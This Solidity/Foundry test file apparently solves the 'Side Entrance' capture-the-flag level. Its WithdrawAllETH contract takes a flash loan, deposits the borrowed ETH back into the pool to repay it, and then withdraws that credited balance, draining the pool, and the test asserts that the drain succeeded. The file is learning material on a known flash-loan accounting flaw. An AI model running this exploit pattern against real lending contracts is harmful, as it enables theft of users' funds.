// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

interface ISideEntranceLenderPool {
    function execute() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external;
    function deposit() external payable;
}

contract WithdrawAllETH {
    ISideEntranceLenderPool internal sideEntranceLenderPool;

    constructor(address _sideEntranceLenderPool) {
        sideEntranceLenderPool = ISideEntranceLenderPool(_sideEntranceLenderPool);
    }

    function getLoan(uint256 amount) external payable {
        sideEntranceLenderPool.flashLoan(amount);
        sideEntranceLenderPool.withdraw();
        payable(msg.sender).transfer(amount);
    }

    function execute() external payable {
        sideEntranceLenderPool.deposit{value: msg.value}();
    }

    receive() external payable {}
}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    WithdrawAllETH internal withdrawAllETH;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");

        withdrawAllETH = new WithdrawAllETH(address(sideEntranceLenderPool));
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.prank(attacker);
        withdrawAllETH.getLoan(ETHER_IN_POOL);

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
